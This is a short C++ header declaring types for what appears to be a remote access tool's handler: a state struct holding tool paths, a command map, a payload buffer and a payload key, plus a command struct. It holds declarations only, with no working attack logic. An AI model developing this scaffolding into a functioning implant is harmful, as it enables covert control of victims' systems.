#pragma once
#include <filesystem>
#include <cstdlib>
#include <unordered_map>
#include <algorithm>
#include <iostream>
#include <string>
#include <vector>

namespace rat::handler{

struct RatState {
    std::unordered_map<std::string, std::filesystem::path> command_path_map;

    std::vector<uint8_t> payload;
    std::string payload_key;
    
    RatState();

    std::filesystem::path getToolPath(const std::string& arg_Tool) const;
    bool hasTool(const std::string& arg_Tool) const;

    void addCommand(const std::string& arg_Key, const std::string& arg_Literal);
    std::string getCommand(const std::string& arg_Key) const;

    std::string listDynamicTools() const;

    std::filesystem::path findExecutable(const std::string& arg_Tool) const;
};
struct Command {
    std::string directive;
    std::vector<std::string> parameters;

    Command() = default;   // <--- add this
    Command(const std::string& arg_Directive, const std::vector<std::string>& arg_Parameters)
        : directive(arg_Directive), parameters(arg_Parameters) {}
};

} // namespace rat
